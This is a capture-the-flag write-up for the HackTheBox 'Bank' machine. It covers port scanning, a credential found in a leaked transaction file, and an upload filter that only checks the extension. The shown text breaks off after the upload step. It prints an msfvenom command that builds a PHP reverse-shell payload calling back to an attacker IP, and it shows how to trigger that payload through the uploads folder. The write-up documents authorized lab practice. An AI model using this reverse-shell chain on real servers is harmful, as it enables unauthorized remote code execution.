# Bank
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/71c41239-7326-462d-9f10-0ee1ebf1d1d8)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.29 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 00:24 PDT
Nmap scan report for 10.10.10.29
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.32 seconds
```

1. Since the machine is running a web application, let's run gobuster.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6f2049b7-a312-46c4-b701-6910f6048bd4)


2. Interesting there's an upload directory, anyway let's open the web app.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6fb85d14-3f41-4138-98e9-a8e600266a05)


3. Already tried several sqli, it seems the login page is not vulnerable to sqli.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/60203418-ab63-4ed7-bbff-3fbbd563e1b4)


4. Let's check the **balance-transfer**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4abdeee-a79f-41cc-af1c-7f22747f9b59)


5. Found many hashed or encrypted (?) transaction, but the odd is, there is one transaction with smaller size.
6. The smaller size might indicate failed hash or encryption.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d359f3f-5ba4-4f73-a18b-a7adeb5ed28e)


> CHECKING THE SMALLER SIZE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3f953452-e518-420b-a4fb-a0af0b8f5d37)


7. Let's use the cred to login!

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8ecfe418-37e8-4773-be37-3abe6f5fa1d7)


8. At the support option, found a file upload. This could be our interest.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2d60b788-93a2-4749-8f1f-1c09e42578ab)


> PAGE SOURCE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca5a1cad-bf5b-4c8c-a88d-92477279b8ca)


9. Turns out it is, it does not sanitize what's inside the file, it just validates the extension must be .htb.
10. Knowing this we can send our PHP payload for reverse shell.

> USING TEMPLATE FROM MSFVENOM

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.26 lport=1337 -f raw > reverse_shell.htb
```

11. Set a listener on port 1337, then upload the file.
12. Next, to trigger the reverse shell, let's opened the file we already within this endpoint --> `/uploads/reverse_shell.htb`.

> RESULT

aa


